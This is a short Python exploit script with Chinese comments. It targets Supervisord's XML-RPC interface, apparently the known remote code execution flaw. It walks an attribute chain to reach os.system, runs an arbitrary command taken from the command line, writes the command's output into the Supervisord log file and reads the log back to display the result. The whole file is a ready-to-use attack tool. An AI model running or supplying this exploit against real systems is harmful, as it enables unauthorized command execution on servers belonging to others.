#!/usr/bin/env python3
import xmlrpc.client
import sys

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} http://target:9001/RPC2 'command'")
    sys.exit(1)

target = sys.argv[1]
command = sys.argv[2]

with xmlrpc.client.ServerProxy(target) as proxy:
    # 1. 记录执行前的日志，用于后面提取命令输出
    old = getattr(proxy, 'supervisor.readLog')(0, 0)
    # 2. 获取Supervisord日志文件路径
    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
    # 3. 通过漏洞链执行命令，并将结果追加到日志文件
    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')(
        '{} | tee -a {}'.format(command, logfile)
    )
    # 4. 读取新的日志内容
    result = getattr(proxy, 'supervisor.readLog')(0, 0)
    # 5. 打印命令执行的结果
    print(result[len(old):])
